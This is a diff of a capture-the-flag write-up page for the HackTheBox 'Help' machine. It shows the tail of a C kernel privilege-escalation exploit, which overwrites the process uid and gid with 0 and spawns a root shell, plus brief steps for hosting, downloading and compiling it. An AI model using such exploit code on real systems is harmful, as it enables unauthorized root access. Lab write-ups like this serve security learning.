+		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus uid ptr"</span><span class="p">);</span>
 
-	uidptr = credptr + UID_OFFSET; // uid
-	if (uidptr &lt; PHYS_OFFSET)
-		__exit("bogus uid ptr");
+	<span class="n">printf</span><span class="p">(</span><span class="s">"uidptr = %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">);</span>
+	<span class="n">__write</span><span class="p">(</span><span class="n">uidptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// set both uid and gid to 0
+</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"spawning root shell</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
 
-	printf("uidptr = %lx\n", uidptr);
-	__write(uidptr, 0); // set both uid and gid to 0
+	<span class="n">__exit</span><span class="p">(</span><span class="s">"not vulnerable?"</span><span class="p">);</span>
+<span class="p">}</span>
 
-	if (getuid() == 0) {
-		printf("spawning root shell\n");
-		system("/bin/bash");
-		exit(0);
-	}
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">prep</span><span class="p">();</span>
+	<span class="n">pwn</span><span class="p">();</span>
 
-	__exit("not vulnerable?");
-}
-
-int main(int argc, char **argv) {
-	prep();
-	pwn();
-
-	return 0;
-}
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div></div>
 <p><br> I ran a python server to host the exploit then I downloaded it on the box :
-<img src="/images/hackthebox/help/24.png" alt="">
+<br><img src="/images/hackthebox/help/24.png" alt=""><br>
 <br> Then I compiled the exploit and ran it :
-<code class="highlighter-rouge">gcc -o exploit exploit.c</code>
-<img src="/images/hackthebox/help/25.png" alt="">
+<br><code class="highlighter-rouge">gcc -o exploit exploit.c</code>
+<br><img src="/images/hackthebox/help/25.png" alt=""><br>
 <br> And we owned root !
 <br> That’s it , Feedback is appreciated !
 <br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
